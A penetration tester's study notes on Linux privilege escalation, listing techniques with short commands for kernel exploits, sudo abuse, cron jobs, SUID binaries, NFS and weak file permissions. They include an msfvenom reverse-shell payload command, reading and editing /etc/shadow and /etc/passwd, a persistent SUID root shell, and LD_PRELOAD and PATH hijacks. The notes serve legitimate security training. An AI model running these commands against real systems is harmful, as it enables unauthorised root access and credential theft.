# Linux Methodology

## Basics

### Strategy

* Check user
* Run enum scripts at increasing levels
* Run manual commands
* Check user home dir
  * /var/backup, /var/log, history files
* Try quickest methods first
* Check internal ports
* Use Kernel exploits LAST

### **Enumerate Permissions in Linux**

* Users
  * Accounts in /etc/passwd
  * password hashes in /etc/shadow
  * identified by a UID
  * root = UID 0
  * 3 types
    * Real - defined in /etc/passwd. who they actually are
    * Effective - when executing a process as another user, thier effective ID is set to that user's real ID.
      * Most Access Control decisions
      * whoami
    * Saved - used to ensure SUID processes can temporarily switch a user's effective ID back to thier Rreal ID and back again without losing track of the original effective ID
* Groups
  * /etc/group
  * Primary and multiple secondary groups
  * Default primary group is same name as user account
* Files/Dir
  * Have a single owner and a group
  * Permissions:read write execute
  * 3 permission sets: owner, group, and all others
* Special permissions
  * setuid (SUID) bit - When set, files will get executed with privileges of the file owner
  * setgid (SGID) bit - When set on a file , files will get executed with the permissions of the file group
    * When set on a directory, files created in that directory will inherit the group of the directory itself
* Viewing permission
  * \#ls -l /file/path
  * First 10 characters are the permissions on the file
  * First character is the type: “-” for file, “d” for directory
  * SUID/SGID permissions are represented by an “s” in the execute position
* User ID commands
  * \#id
  * \#cat /proc/\$$/status | grep “\[UG]id”
* Spawning root shells
  * /bin/sh or /bin/bash
  * “rootbash” suid
    * Make a copy of the /bin/bash executable - make sure it is owned by root user and has the SUID bit set
    * A root shell can be spawned by simply executing the rootbash file wiht the -p flag
    * This is a persistent shell
  * Custom executables
    * When a root process executes another process that you can control
  * msfvenom
    * &#x20;can be used to genereate an executable elf file
    * $msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=\<IP> LPORT=\<port> -f elf > shell.elf
    * can be caught with netcat or multi/handler
  * Native reverse shells
    * [https://github.com/mthbernardes/rsg](https://github.com/mthbernardes/rsg)
    * Can all be caught with netcat listener

## Techniques

### Kernel exploits

* \#uname -a Enumerate Kernel verison
* Find matching exploit, compile, and run
  * \#searchsploit \[option] \[option]
  * \#linux-exploit-suggester-2.py
  * \# uname -ar
  * \# cat /etc/issue
  * \# cat /etc/\*-release
  * \# cat /etc/lsb-release # Debian based
  * \# cat /etc/redhat-release # Redhat based
* [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)
* [https://github.com/SecWiki/linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits)
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
* [https://github.com/bcoles/kernel-exploits](https://github.com/bcoles/kernel-exploits)
* _PTFM: Dirty Cow PrivEsc pg. 92_&#x20;

### Service Exploits

* \#ps aux | grep “^root” Show all processes runnign as root
* \#netstat -nl Show all actice connections (look for services)
* Try to ID verison number and research for exploits
  * \#\<program> -v or --version show version number
  * \#dpkg -l | grep \<program>
  * \#rpm -qa | grep \<program>
* Some processes running as root may be bound to an internal port through which it communicates
  * If it cannot be run locally on the target machine, the port can be forwarded using ssh to your local machine
  * $ssh -R \<local port>:127.0.0.1:\<service-port> \<username>@\<local-machine>
  * Run netstat to see what services are listening to 127.0.0.1:\<port>, then use port forwarding to send to the target port

### Weak File permissions

* /etc/shadow
  * Readable - copy and crack the Root user hash
  * writeable - copy and edit the shadow file with new root password
* /etc/passwd
  * For backwards compatibility, if the second field of a user row is a passwrod hash, it takes precedent over /etc/shadow
  * Either replace the password for root, or append a new user with root permissions.
  * Delete the x in the second field reads as if there is no password for user
* Backups
  * Some can be readable to gather interesting files

### Sudo abuse

* Rules in /etc/sudoers
* Useful commands
  * \#sudo -u \<username> \<program>
  * \# sudo -l (show what you can run)
  * @ sudo -s
  * \#sudo -i
  * \#sudo /bin/bash
  * \#sudo passwd
* Shell escape sequences
  * [https://gtfobins.github.io/](https://gtfobins.github.io)
  * search for the commands/binaries you can run as sudo, then pass arguements that force a new root shell
* Abusing intended functionality
  * Read/write to files owned by root
  * EX apache2 - it will try to read the first line of any file passed as an arguement.
    * \#sudo apache2 -f /etc/shadow
* Environment variables
  * Programs run through sudo can inherit the environment variables from the user's environment
  * In the /etc/sudoers file, The options env\_reset and env\_keep options are available. These are displayed wiht #sudo -l
  * LD\_PRELOAD variable that can be set to the path of a shared object file (.so)
    * By creating a custom shared object and an init() funciton, we can execute code as soon as the object is loaded
    * Will not work if real userID is different from effectiveID. ALso, sudo must have env\_keep option
    * \#sudo LD\_PRELOAD=\<path to created shared object> \<command you can run as sudo>
  * LD\_LIBRARY\_PATH
    * set of directories where shared libraries are searched for first
    * Print shared libraries uxsed by a program
      * \#ldd /usr/sbin/apache2
    * By creating a shared library wiht the same name as one used by a program, and setting the LD\_LIBRARY\_PATH to its parent dir, the program will load our shared library instead.
* Sudo Caching
  * _PTFM: Sudo Caching - pg. 93_

### Cron Jobs

* Run at the security level of the user that owns them
* Default run with /bin/sh with limited envi variables
* Cron table files (crontabs) store config for cron jobs
* Cronjobs are located in /var/spool/cron/ or /var/spool/cron/crontabs/
* System wide crontab is located in /etc/crontab
* If we can write to a program or script that gets run with a cronjob, we can replate it with our own code
* PATH envi variable
  * default set to /usr/bin
  * Can be overwritten in the crontab file
  * If a cronjob script/program does nto use absolute path and one of the path dir is user writeable, you can create a program or script with the same name as the cronjob
* Wildcard
  * When a wildcard char (\*) is provided to a command as par tof an arguement, the shell will first perform filename expansion (globbing) on the wildcard
  * this process replaces the wildcard with a speace-separated list of the file and directory names in the current directory
  * Can create filenames that match cmd line options like “--help”
*

### SUID/SGID Executables

* Find files with the SUID/SGID bit set
  * \#find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec la -l {} \\; 2> /dev/null
  * Can use shell escape sequences on SUID/SGID files
  * _PTFM: BSUID and SGID - pg. 93_
* Known Exploits - certain programs use SUID files as part of thier process or install.
  * Search for these! Look for exim!
* Shared Object Injection
  * Use strace to track system calls from a program to any shared objects it is trying to call
  * If we can write to the location, we cna create an object that will run wiht the program
  * Create a c file that creates a file
  * Compile the c file
    * \>gcc
* PATH envi variable
  * If a program tries to execute another by only using the program and and not the absolute path, we can tell the shell where to look
  * Finding vulnerbable programs
    * Those sub-secuted files are often mentioned as a string in the program.
    * Run strings on the host executable
    * Can also use strace or ltrace
    * \#strace -v -f -e execve \<command> 2>&1 | grep exec
    * Attack
      * Create new shell executable names the sub-executed service
      * Set the path varibale to the path of the newly created executable
      * \#PATH=.:$PATH \<host file to execute>
* Abusing shell features
  * Older versions <4.2-048 can define user functions with an absolute path name
    * These can be exported and can take precedence over the actual executable being called
    * \#function \<service oyu want to impersonate> { /bin/bash -p; )
    * \#export -f /user/sbin/service
  * Debugging mode which can be enabled with the -x command or by modifying SHELLOPTS to inclide xtrace
    * SHELLOPTS is read only, but the env command allows SHELLOPS to be set
    * When in debugging mode, Bash uses the env var PS4 to display an extra prompt for debug statements. This variebl can contain embedded commands
    * If an SUID file runs another via bash, those envi variables can be enherited.
    * This does not work on bash past 4.4
* [**Linux Privilege Escalation using SUID Binaries**](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

### Passwords and Keys

* Service PWs may be stored in plain text in config files
* History files may contain a password used as part of a command
  * \#ls -a -> look for \_history files
* Config files
  * opnevpn files -> auth-user-pass option
* SSH Keys - can be used in leu of passwords

### NFS

* Shares configed under /etc/exports
  * &#x20;created files inherit remote users UID and GUID even if they do not have an account locally
* Commands
  * \# showmount -e \[target]
  * \# nmap -sV -script=nfs-showmount \[target]
  * \#mount -o rw,vers=2 \[target]:\[share] \[local dir]
* [**Linux Privilege Escalation using Misconfigured NFS**](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)

### Python Library Hijacking

* [**Linux Privilege Escalation: Python Library Hijacking**](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/)

### Misc

* [**Editing /etc/passwd File for Privilege Escalation**](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
* [**Linux Privilege Escalation using LD\_Preload**](https://www.hackingarticles.in/linux-privilege-escalation-using-ld\_preload/)
* [**Linux Privilege Escalation Using PATH Variable**](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
* [**Linux For Pentester: socat Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-socat-privilege-escalation/)
* [**Linux for Pentester: scp Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-scp-privilege-escalation/)
* [**Linux For Pentester: tmux Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-tmux-privilege-escalation/)
* [**Linux for Pentester: ed Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/)
* [**Linux for Pentester: sed Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-sed-privilege-escalation/)
* [**Linux for Pentester: pip Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/)
* [**Linux for Pentester: git Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-git-privilege-escalation/)
* [**Linux for Pentester: cp Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)
* [**Linux for Pentester: Taskset Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-taskset-privilege-escalation/)
* [**Linux for Pentester: Time Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-time-privilege-escalation/)
* [**Linux for Pentester: xxd Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-xxd-privilege-escalation/)
* [**Linux for Pentester : ZIP Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/)
* [**Linux for Pentester: APT Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)
* [**Linux for Pentester: CAT Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-cat-privilege-escalation/)
* [**Linux for Pentester: Find Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/)
* [**Linux for Pentester: Wget Privilege Escalation**](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/)
